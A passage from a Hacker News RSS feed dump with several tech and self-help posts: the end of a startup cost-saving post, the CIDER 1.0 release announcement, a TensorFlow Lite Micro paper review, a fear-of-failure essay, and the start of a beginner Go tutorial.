<p>While I was happy with this solution for the first few months, I quickly noticed issues with relying on a free tier for something as important as my email. I was experiencing almost no deliverability to outlook.com and hotmail.com email addresses. This is because spammers also tend to use these services (Mailgun, Sendgrid) and they end up “polluting” the shared IPs that are used in these free tiers, causing them to be blacklisted by email service providers.</p>

<p>Eventually, I grew frustrated enough with the deliverability issues that I upgraded from Mailgun to GSuite.</p>

<p>Having every form of communication from my users arrive in my work inbox has actually simplified my workflow and hasn’t felt overwhelming yet. Furthermore, I use filters, tags and the snooze feature religiously, so if you have a good system, this can also help to improve your workflow. My work email is essentially my TODO list so I like to keep it clean and as close to empty as possible!</p>

<h3 id="final-cost-and-savings-1">Final Cost and Savings</h3>

<p><strong>Set up time cost:</strong> 15 minutes to set up Mailgun and/or GSuite</p>

<p><strong>Paid solutions:</strong></p>

<ul>
<li>Zendesk offered at $5/month</li>
<li>Front offered at $12 per month</li>
<li>HiverHQ offered at $15/month</li>
<li>Helpscout offered at $25/month</li>
</ul>

<p><strong>Estimated savings:</strong> $15 per month or $180 per year</p>

<p><strong>Cost:</strong> $6/month</p>

<p><strong>Pays for itself:</strong> immediately</p>



<p>Let’s talk about drip campaigns. They are crucial to customer engagement and guiding your users to eventual conversion. However, many tools out there designed to help you manage your drip campaigns are overloaded with features and therefore really expensive. Furthermore, they require set up and integration since you’ll want to update the service with your customer’s traits so they can be segmented and targeted properly. Overall, I felt these tools brought a lot of extra overhead for a cost that was way too high.</p>

<p>So I started thinking about what it would take to implement my own simple drip campaign. I figured I could start off pretty simple and just email a user over the course of their trial 3 times: when they sign up, one week before their trial ends to offer a trial extension, and on the last day of their trial.</p>

<p>These were all straightforward queries to the database. I store the join dates for all users as well as a type so I know how long their trial is. I also have to hit the Stripe API to make sure that I wasn’t asking already-converted users to convert. This was another nice thing– I could query all the information directly when I needed it, instead of playing telephone between multiple services via webhooks.</p>

<p>Using Redis queues (free as a Heroku add-on) with <a href="https://optimalbits.github.io/bull/">Bull</a>, I created a daily repeating worker which would, for each email template, query the database and retrieve all eligible users, double check their Stripe status and double check that they haven’t already been sent this email (safeguarding in case the queue hiccups and the job retries itself) and eventually sends the email.</p>

<p>I use <a href="https://postmarkapp.com/">Postmark</a> as my email service provider. I’m a big fan of Postmark after experiencing the lowest lows with Sendgrid and Mailgun. Postmark has a rigid selection process to ensure spammers do not get on their platform and so they maintain high deliverability rates. The best part is they offer a $75 credit to bootstrapped startups which gets you 7 months of free service if you send under 10,000 emails a month.</p>

<p>My solution is working great for me so far as I have no complaints. I have all the open rate and CTR stats I need from Postmark and I can corroborate the data easily by querying my database to see how many actually extended their trial. I have also since added a 4th email: if you extend your trial, we send an email to follow up on how the extension is going.</p>

<p>The key is to make your homegrown solution robust and extensible from the beginning. I can’t see a reason yet why I would switch to a paid full-service tool anytime soon!</p>

<h3 id="final-cost-and-savings-2">Final Cost and Savings</h3>

<p><strong>Set up time cost:</strong> 3 hours to set up queues once and write the code to power your campaign and write tests</p>

<p><strong>Paid solutions:</strong></p>

<ul>
<li>Drip offered at $49/month</li>
<li>Intercom offered at $49/month</li>
<li>Customer.io offered at $150/month</li>
</ul>

<p><strong>Estimated savings:</strong> $80 per month or $960 per year</p>

<p><strong>Cost:</strong> 3 hours at $75/hour = $150 in engineering cost</p>

<p><strong>Pays for itself in:</strong> 3 months</p>

	</div></div>]]>
            </description>
            <link>https://lunchbag.ca/how-my-startup-saves-100-dollars-a-month-with-home-grown-solutions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568215</guid>
            <pubDate>Tue, 29 Dec 2020 09:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cider 1.0]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25568181">thread link</a>) | @rayxi271828
<br/>
December 29, 2020 | https://metaredux.com/posts/2020/12/28/cider-1-0.html | <a href="https://web.archive.org/web/*/https://metaredux.com/posts/2020/12/28/cider-1-0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>You can’t really know where you are going until you know where you have been.</p>

  <p>– Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don’t remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren’t many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software…</p>

<p>Tim King came across Phil’s post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project’s
steward ever since. Third time’s a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I’m fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we’ve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I’m the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there’s also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release… Oh, well…</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(“Sofia”)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There’s nothing particularly interesting in this
release - it’s almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it’d probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I’m reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we’ve had to endure. While I
can’t help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what’s next? I don’t really have any particular plans for CIDER 1.1, so we’ll see how exactly it’s
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I’m also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label “Good First Issue” on CIDER’s issue tracker, so if you’re looking for
more fun challenges after the end of the “Advent of Code” be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I’m writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER’s community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>



  </div></div>]]>
            </description>
            <link>https://metaredux.com/posts/2020/12/28/cider-1-0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568181</guid>
            <pubDate>Tue, 29 Dec 2020 09:33:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TensorFlow Lite Micro]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25568090">thread link</a>) | @anupamchugh
<br/>
December 29, 2020 | https://heartbeat.fritz.ai/tensorflow-lite-micro-e3f27f1eed1b | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/tensorflow-lite-micro-e3f27f1eed1b">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2 id="fec4">Embedded Machine Learning on TinyML Systems Paper Review</h2><div><div><div><p><a href="https://mwitiderrick.medium.com/?source=post_page-----e3f27f1eed1b--------------------------------" rel="noopener"><img alt="Derrick Mwiti" src="https://miro.medium.com/fit/c/96/96/2*9aohLPF6ipIrrmZ50g8zNQ.jpeg" width="48" height="48"></a></p></div></div></div></div></div><div><div><p id="0004">According to <a href="https://www.statista.com/statistics/935382/worldwide-microcontroller-unit-shipments" rel="noopener">Statistica</a>, 25.6 billion units of microcontrollers were shipped in 2019. There are over 250 billion microcontrollers in the world and this number is projected to grow over the coming years. As a result of this, deep learning on embedded devices is one of the fastest-growing fields. This area is popularly known as tiny machine learning (TinyML). That said, embedded devices pose a couple of challenges, key among them being their low processing power and limited memory. Machine learning models must therefore be able to work on just a few kilobytes of memory. They must also be able to perform inferencing with the low processing power available in embedded systems. In this piece, we’ll look at TensorFlow Lite Micro (TF Micro) whose aim is to run deep learning models on embedded systems. TF Micro is an open-source ML inference framework that has been fronted by researchers from Google and Harvard University. It addresses the resource constraints faced with running deep learning models on embedded systems.</p><p id="c221">The <a href="https://arxiv.org/abs/2010.08678" rel="noopener">authors</a> of the above TinyML article start by highlighting some of the applications of TinyML technology. Key among them being:</p><ul><li id="a784">Wakeword detection — waking up a device with a certain phrase, e.g., ‘Ok, Google.’</li><li id="aee7">Predictive maintenance — resulting from analysis and modeling of signals from microphones, sensors, and accelerometers, just to mention a few.</li><li id="8c6c">Acoustic-anomaly detection.</li><li id="169b">Visual object detection.</li><li id="039e">Human-activity recognition.</li></ul><p id="148a">Next, the authors highlight the major challenges faced when implementing machine learning in embedded devices. These include:</p><ul><li id="2bf1">There is a lack of a unified TinyML framework for embedded devices.</li><li id="c5f9">Deploying models on embedded devices is slow.</li><li id="5cd9">Vendors produce different hardware types, hence making it difficult to evaluate hardware performance.</li><li id="f019">There is a lack of basic features such as memory management and library support.</li></ul><p id="d60d">The proposed TensorFlow Lite Micro (TF Micro) is aimed at solving these challenges.</p><p id="c14f">The TF Micro framework has been designed with the following principles:</p><h2 id="67dc">Minimize Feature Scope for Portability</h2><p id="c181">This means that an embedded machine learning framework assumes that the model, input data, and output arrays are in memory. The framework should handle ML computations based on those values, meaning that the library will omit features such as loading models from a filesystem or accessing peripherals for inputs. This design principle is crucial because many embedded platforms don’t have a memory management mechanism as well as library support.</p><h2 id="da0f">Enable Vendor Contributions to Span Ecosystem</h2><p id="5819">As a result of device fragmentation, developers can’t build software that runs well on different embedded platforms. In order to tackle this challenge, the authors ensure that optimizing the core library operations is easy. They aim for ensuring significant technical support for developers. The authors also encourage submissions to a library repository.</p><h2 id="8c6b">Reuse TensorFlow Tools for Scalability</h2><p id="2b6f">Exporting a model comes with its own set of challenges. Key among them being export errors that result from developers converting a model to a format that can run on an embedded device. Another challenge is the lack of support for some operations on the target device. It is also important to note that most models are trained on floating operations and these operations consume more space and memory and would therefore be unsuitable for an embedded device. This can be addressed by converting them to a quantized representation. This, however, increases the exporter complexity. To address these challenges, a converter is built on top of the existing TensorFlow Lite toolchain. This has been extended for deeply embedded machine learning systems.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1082/1*uzTxmEwSPUqcqMoeYZE-dA.png" width="541" height="179" srcset="https://miro.medium.com/max/552/1*uzTxmEwSPUqcqMoeYZE-dA.png 276w, https://miro.medium.com/max/1082/1*uzTxmEwSPUqcqMoeYZE-dA.png 541w" sizes="541px" data-old-src="https://miro.medium.com/max/60/1*uzTxmEwSPUqcqMoeYZE-dA.png?q=20"></p></div></div></figure><h2 id="bf8c">Build System for Heterogeneous Support</h2><p id="6040">This feature aims at achieving a flexible build environment that doesn’t rely on any one platform. This would definitely encourage the adoption of TF Micro by developers.</p><p id="9a9b">Developing a TF Micro application involves a couple of steps. The first one is to create a live neural-network-model object in memory. The application developer starts by producing an operator resolver object via the Client API. The operator resolver controls which operations link to the final binary in order to reduce the size of the executable.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/996/1*v5y1QXRAD2_0PXEHc5h0TQ.png" width="498" height="513" srcset="https://miro.medium.com/max/552/1*v5y1QXRAD2_0PXEHc5h0TQ.png 276w, https://miro.medium.com/max/996/1*v5y1QXRAD2_0PXEHc5h0TQ.png 498w" sizes="498px" data-old-src="https://miro.medium.com/max/58/1*v5y1QXRAD2_0PXEHc5h0TQ.png?q=20"></p></div></div></figure><p id="5506">The second step is to provide a contiguous memory array referred to as the arena. The arena holds intermediate results and variables that are needed by the interpreter.</p><p id="267b">The third step is to create an interpreter instance. The instance arguments are the model, operator resolver, and the arena. During the initialization phase, the interpreter allocates all required memory from the arena. All communications between the interpreter and operators are handled by a C API. This ensures that operator implementations are modular and independent of the interpreter’s implementation.</p><p id="e98e">The fourth step is the model execution. At this point, the application retrieves pointers to the memory regions that represent the model inputs. It then populates them with values mainly obtained from sensors or user-supplied data. With the inputs available, the interpreter is invoked so that it can perform model calculations.</p><p id="192b">Finally, the interpreter returns control to the application after it has evaluated all the operations.</p></div></div></div>]]>
            </description>
            <link>https://heartbeat.fritz.ai/tensorflow-lite-micro-e3f27f1eed1b</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568090</guid>
            <pubDate>Tue, 29 Dec 2020 09:16:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Overcome the Fear of Failure as an Entrepreneur]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25568011">thread link</a>) | @vitabenes
<br/>
December 29, 2020 | https://www.deprocrastination.co/blog/how-to-overcome-fear-of-failure | <a href="https://web.archive.org/web/*/https://www.deprocrastination.co/blog/how-to-overcome-fear-of-failure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>One of the most common causes of procrastination is the fear of failure.</p><p>Let’s imagine we have a task to do and we feel negative about it for some reason.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image19.png" referrerpolicy="no-referrer" alt="Negative emotions are like a hill"></p><p>That makes it harder to do, but we can&nbsp;<em>make it even harder</em>. Much harder. How?</p><p>We might think&nbsp;<strong>we cannot possibly make a single mistake.</strong></p><p>Maybe we adopted this attitude from our parents or our teachers in school. Whatever the reason, many of us fear failure and don’t see it as a natural part of the process.</p><p>So, failure turns from something natural, though unpleasant, into a lethal threat.&nbsp;<strong>Every simple task becomes a tightrope walk over a deadly chasm.</strong></p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image27.png" referrerpolicy="no-referrer" alt="Fear of failure is like a chasm"></p><p>No wonder the fear of failure is so paralyzing. When we perceive every mistake as a possible death (or sacking, or dropping out, or a proposal rejection), it raises our stress levels and we try to relieve them by procrastinating.</p><p>We make ourselves into a tightrope walker.</p><h2><strong>What a tightrope walker believes</strong></h2><h3><strong>If I fail, I’m worthless and destined to die</strong></h3><p><em>If this business fails, I’m clearly someone who can’t have any kind of business.</em></p><p><em>If this book doesn’t hit the bestseller list, I’m clearly not a good writer.</em></p><p><em>If I don’t pass this subject, I’m clearly never going to be good at it.</em></p><p>Some of us have a tendency to view failure as a fatal verdict.</p><p><em>If I fail, I’m clearly not good enough.</em></p><p>When we fail (which we inevitably will at some point), we can take it as the end. We get crushed.</p><p><em>Well, better do something else.</em></p><p>The thing is, everyone fails. We lose money, we lose partners, projects fail… but not all of us react in the same way.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image43.png" referrerpolicy="no-referrer" alt="Different reactions to failure"></p><p><strong>Most of the time, failure isn’t a fall off a cliff.</strong></p><p>We humans have an uncanny ability to recover from all sorts of mistakes,&nbsp;<em>if we allow ourselves to.</em></p><p>It’s foolish to expect that we'll be good at everything we try and won’t fail ever.</p><p>Let’s update our view of failure.</p><h3><strong>When I fail, I’ll get back on my feet</strong></h3><p>Everything doesn’t depend on one single performance most of the time.</p><p><strong>When you look at the lives of successful people, we see that they failed many, many times.</strong></p><p>Legendary investor Ray Dalio at one point lost all his money. Entrepreneur Elon Musk at one point didn’t have enough money for rent. Apple founder Steve Jobs was at one point kicked out of the very company he started!</p><p>If these people took those failures as fatal diagnoses of their worthlessness, neither one of them would build billion dollar companies.</p><p>They learned from their failures and got back into a ring.</p><p><strong>Failures big and small happen all the time. The important part is recovering, learning from them (so then they don’t repeat) and taking them in stride.</strong></p><h3><strong>Performance = my self-worth</strong></h3><p>As with perfectionists, people who fear failure identify with their work.</p><p>New project? If it doesn’t pan out, I’m a failure.</p><p>Test in school? If I get an F, I’m an idiot.</p><p>If I’m not first, I’m below average.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image55.png" referrerpolicy="no-referrer" alt="Self-worth tied to an outcome"></p><p>Failure is not a fatal diagnosis. One F doesn’t make someone an idiot, it simply points to their current level of mastery of the subject. And that level can improve with effort.</p><p><strong>Failure is not a diagnosis of worthlessness.</strong></p><h3><strong>Performance = current level of ability, I can always improve</strong></h3><p>You’re at a competition and you lose.</p><p>You’re taking a test and you hand in an empty test with just your name.</p><p>You make a presentation on the wrong topic.</p><p>Happens to everyone. You can’t win every contest and succeed with every project for the rest of your life.</p><p>So why not take a particular performance (presentation, project, test,...) as just one performance at one point in time?</p><p>Every product of our effort is a clue whether we’re going in the right direction or not.</p><p>Bad performance? Okay, what do we have to change? How can I get better at this?</p><p>Good performance? Awesome, let’s go full steam ahead.</p><h2><strong>Mindset shifts</strong></h2><p>To summarize, here are the 2 main mindset shifts to take away:</p><ul><li>When I fail, I take it as a fatal diagnosis of my worthlessness.<br>→<br><strong>When I fail, I’ll reflect on how I can improve.</strong></li><li>My performance = my self-worth.<br>→<br><strong>My performance = my current level of ability.</strong></li></ul><p>Now let’s take a look at some tools and exercises that can help us manage and reduce the fear of failure.</p><div><div><p>Hi there! This is a free sample chapter from our book.</p><p>If you want to get a whole comprehensive guide about procrastination and learn about each fear deeply,&nbsp;<a href="https://www.deprocrastination.co/guide">check out our handbook.</a></p><p>We put hundreds of hours of research into it, so you don’t have to. And also we keep updating it often to give you the best, most concrete strategies for dealing with procrastination.</p></div></div><h2><strong>1. Put the fear of failure into perspective</strong></h2><h3><strong>How to overcome fear: Understand your options</strong></h3><p>We sometimes think that our situation is one big dead-end.</p><p>We might have a job we depend on and be unable to do what we want because it would mean losing it.</p><p>Or we might have one big project we’re working on that would sink us deep into debt if it didn’t pan out.</p><p>The problem with scenarios like this is that they put tremendous pressure on us.</p><p>And we try to ease it off by procrastinating.</p><p>If we have one thing to do and its failure would mean the end of the world, every step we’re unsure of becomes a tightrope walk.</p><p>One email or a blank page of a document turns into the possibility of apocalypse.</p><p>Who wouldn’t be stressed in a situation like that?</p><p>What if we could ease the pressure a little more?</p><h2><strong>Use the fear of regret</strong></h2><p><img src="https://www.deprocrastination.co/assets/book_images_2/image13.png" referrerpolicy="no-referrer" alt="Fear of regret outweighing fear of failure"></p><p>Elon Musk estimated the odds of his success with SpaceX to be about 40%.</p><p>Jeff Bezos thought Amazon had about 30 % chance of succeeding.</p><p>How then could they make the decision to start? How come they didn't worry and dwell on those odds? How could Musk invest millions of his own money into SpaceX?</p><p><strong>Because it was worth it.</strong></p><p>Fear is only one side of the equation. Depression, regret, sadness,.. those are on the other side.</p><p>For Musk, the other side of the equation was profound sadness. If humanity couldn't go to Mars, that would be depressing to him on a fundamental level.</p><p>For Bezos, it was regret that helped him overcome his fear. He read that the Internet was growing 2300 % a year. That seemed like a great opportunity. But he already had a great job in New York, how could he leave it and start from scratch something risky?</p><h2><strong>2. Set yourself up to learn if you fail</strong></h2><p>As we mentioned before,&nbsp;<strong>failure is most often not fatal, especially when it comes to business or creative endeavors.</strong></p><p>Yes, you might give a bad presentation. You might paint a lousy portrait. You might cause someone discomfort because your app didn't work. That happens. It's not the end of the world.</p><p><strong>Failure doesn't feel great, but you'll survive. You'll get back up and try again.</strong></p><h3><strong>"It might not work"</strong></h3><p>Seth Godin, a best-selling author and master marketer, often repeats this phrase:</p><p><em>"Do things that might not work."</em></p><p>Why does he do that?</p><p><strong>This phrase acknowledges that in creative work you might fail, you might disappoint someone, you might feel bad, but you should still try. You should still try to innovate, to push yourself, to create.</strong></p><p>So there's always some risk of failure, but a) the failure is most often not fatal and b) you can reduce the risk of failure.</p><h2><strong>Summary:<br>Failure is not fatal, it’s a stepping stone</strong></h2><p>Failures, mishaps, personal embarrassments,... they aren’t the end of the world even though it may seem like it at the moment.</p><p><strong>Failure in the right direction is a good thing.</strong></p><p>Exercises like negative visualization or plan B and Z help us prepare for potential catastrophes and also dispel unnecessary fear.</p><p>When you find yourself procrastinating because of the fear of failure:</p><ol><li><p>Put the fear of failure into perspective</p><ol><li><strong>Negative visualization</strong><br>Think about the worst-case scenario. Imagine it vividly. What's really the worst case</li><li><strong>Plan B and Z</strong><br>Think what your plan B would be if you failed with A. How could you make a living then? And if sh*t hits the fan, create a contingency plan (plan Z). What would you do if everything fails?</li><li><strong>Regret minimization framework</strong><br>Ask yourself:<br><em>When I'm 80 and looking back on my life, would I regret not taking this opportunity?</em>&nbsp;<br>Use your fear of regretting something for the rest of your life to overcome the fear of failure and take the leap.</li><li><strong>Win-win</strong><br>Ask yourself:<br><em>How would I win even if I failed?</em></li></ol></li><li><p>Set yourself up to learn if you fail</p><ol><li><strong>Reduce risk by experimenting</strong><br>Try things in private, free of judgment. Test your ideas.</li><li><strong>Reflect on past failures</strong><br>Remember Ray Dalio's mantra:<br><em>Pain + Reflection = Progress</em></li></ol></li></ol><p>These 6 tools will help you overcome your fear of failure and stop procrastinating. We hope you find them useful.</p></article></div>]]>
            </description>
            <link>https://www.deprocrastination.co/blog/how-to-overcome-fear-of-failure</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568011</guid>
            <pubDate>Tue, 29 Dec 2020 09:00:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: An Introduction to Golang]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25567938">thread link</a>) | @gabrieltanner
<br/>
December 29, 2020 | https://gabrieltanner.org/blog/an-introduction-to-golang | <a href="https://web.archive.org/web/*/https://gabrieltanner.org/blog/an-introduction-to-golang">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Golang also known as Go is an open-source, compiled and statically typed programming language developed by Google.</p><p>Go is a compiled, concurrent, statically-typed general purpose programming language with simple syntax and a robust standard libraries. Go improves upon concepts like imperative and object-oriented programming and thereby simplifies the working environment for developers.</p><p>In this guide, you will learn everything you need to know to get started using Go to build real-world applications.</p><h2 id="why-learn-golang">Why learn Golang?</h2><p>Now you still might be asking why should I learn Golang with all the other alternatives out there. Here is a list of some of the cons of the Go programming language.</p><ul><li>Simple syntax - Go has concise and straightforward syntax that makes writing readable and maintainable code easy.</li><li>Compiled language</li><li>Static linking - The compiler supports static linking which means you can statically link your project into one massive binary and then simply deploy it to the cloud or a server.</li><li>Open source - Go is open-source so you can read the source code and contribute to the repository.</li></ul><p>Now that you have a sense of what Golang is and what it brings to the table let's jump into the installation and basics.</p><h2 id="installation">Installation</h2><p>Go can be installed on all three major platforms Windows, Linux and Mac. </p><h3 id="windows-">Windows:</h3><p>Download the latest <a href="https://golang.org/dl/">Windows Golang MSI</a> and execute it on your machine. Follow the instruction prompts to install Go in your root directory and automatically set up an environment variable for your terminal.</p><h3 id="linux-">Linux:</h3><p>On Linux you can download the tar file from the <a href="https://golang.org/dl/">official website</a> and unzip it to /usr/local.</p><h3 id="mac-">Mac:</h3><p>On Mac you can download the Mac installer from the <a href="https://golang.org/dl/">official website</a> and execute it using a double tap. </p><h3 id="verifying-the-installation-">Verifying the installation:</h3><p> You can verify the installation by running the following command in your terminal.</p><pre><code>go --version</code></pre><p>After installing, you will continue by taking a look at the basic syntax and features Golang provides.</p><h2 id="basic-structure">Basic structure</h2><p>Let's start by taking a look at the basic structure of a Golang program. For that, we are going to take a look at a hello world example.</p><pre><code>package main

import "fmt"

func main() {
    fmt.Println("Hello World!")
}</code></pre><p>All Go programs must be part of a package, and here you use main to make the file executable. The main package requires a main function, which will be called when running the file.</p><p>You must import all the packages you use including all the standard libraries like fmt in this case.</p><p>Use the following command in your terminal to run the file:</p><pre><code>go run main.go</code></pre><h2 id="variables">Variables</h2><p>In this section, you will learn the different ways to declare and initialize variables.</p><p>Golang is statically typed, which means that variables either explicitly or implicitly assign a type before your program runs.</p><h3 id="declaring-variables-">Declaring variables:</h3><p>Variables can be declared using the <em>var</em> keyword followed by the <em>variable name</em> and the <em>datatype</em>.</p><pre><code>var i int
var s string</code></pre><h3 id="initializing-variables-">Initializing variables:</h3><p>After declaring the variables they can be initialized using the <em>=</em> operator.</p><pre><code>i = 20
s = "Some String"</code></pre><p>It is equally valid to declare and initialize the variable in a single line.</p><pre><code>var k int = 35</code></pre><p>You can also omit the type when initializing the variable at the time of declaration.</p><pre><code>var score = 10</code></pre><h3 id="short-variable-declaration-">Short variable declaration:</h3><p>The <em>var</em> keyword can also be omitted using the <em>:=</em> short variable declarator.</p><pre><code>j := 50
str := "Some String!"</code></pre><h3 id="declaring-multiple-variables-">Declaring multiple variables:</h3><p>It is also possible to declare multiple variables in a single line of code.</p><pre><code>firstName, lastName := "FirstName", "LastName"</code></pre><h3 id="variable-declaration-block-">Variable Declaration Block:</h3><p>Variable declarations can also be grouped together for better readability and cleaner code.</p><pre><code>var (
    name = "Donald Duck"
    age  = 50
)</code></pre><h2 id="constants">Constants</h2><p>A constant is a variable with a fixed value that cannot change under any circumstances.</p><h3 id="declaring-a-constant-">Declaring a constant:</h3><p>Constants are declared by using the <em>const</em> keyword instead of <em>var</em>. You must assign the value at the time of the declaration because the value will fix it after that.</p><pre><code>const PI float64 = 3.14159265359
const VALUE = 1000</code></pre><p>Note: The names of constant variables are usually written in uppercase.</p><h3 id="declaring-using-a-declaration-block-">Declaring using a declaration block:</h3><p>Constants can also be declared using declaration blocks for better readability.</p><pre><code>const (
	PRODUCT  = "Ice Cream"
	QUANTITY = 50
)</code></pre><h2 id="datatypes">Datatypes</h2><p>As already mentioned Golang is a statically typed programming language, which means that variables always have a type that cannot change.</p><p>Here is a list of all the datatypes available in Golang:</p><pre><code>uint8       unsigned  8-bit integers (0 to 255)
uint16      unsigned 16-bit integers (0 to 65535)
uint32      unsigned 32-bit integers (0 to 4294967295)
uint64      unsigned 64-bit integers (0 to 18446744073709551615)
int8        signed  8-bit integers (-128 to 127)
int16       signed 16-bit integers (-32768 to 32767)
int32       signed 32-bit integers (-2147483648 to 2147483647)
int64       signed 64-bit integers (-9223372036854775808 to 9223372036854775807)

float32     IEEE-754 32-bit floating-point numbers
float64     IEEE-754 64-bit floating-point numbers
complex64   complex numbers with float32 real and imaginary parts
complex128  complex numbers with float64 real and imaginary parts

byte        alias for uint8
rune        alias for int32

uint     unsigned, either 32 or 64 bits
int      signed, either 32 or 64 bits
uintptr  unsigned integer large enough to store the uninterpreted bits of a pointer value</code></pre><p>You can set the data type of a variable after the variable name.</p><pre><code>// Integer
var i int = 5
fmt.Println(i)

// String
var s string = "Hello World!"
fmt.Println(s)

// Float
var f float64 = 3.14159265359
fmt.Println(f)

// Boolean
var b bool = true
fmt.Println(b)</code></pre><h2 id="converting-datatypes">Converting Datatypes</h2><p>Converting also known as casting datatypes, is an important concept when needing a precise type is expected. This section will show you the most common type conversions.</p><h3 id="string-to-float-">String to float:</h3><p>One of the most common conversions is a string to a float. For this, you use the strconv package, which is the standard package for converting strings to basic datatypes.</p><pre><code>s := "3.1415926535"
f, err := strconv.ParseFloat(s, 8)

if err != nil {
    fmt.Println("Error convert string to integer", err)
}

fmt.Println(reflect.TypeOf(f))</code></pre><h3 id="float-to-string-">Float to string:</h3><p>Converting a float to a string is a bit easier because their cannot be an error.</p><pre><code>var flo float64 = 3.1415926535
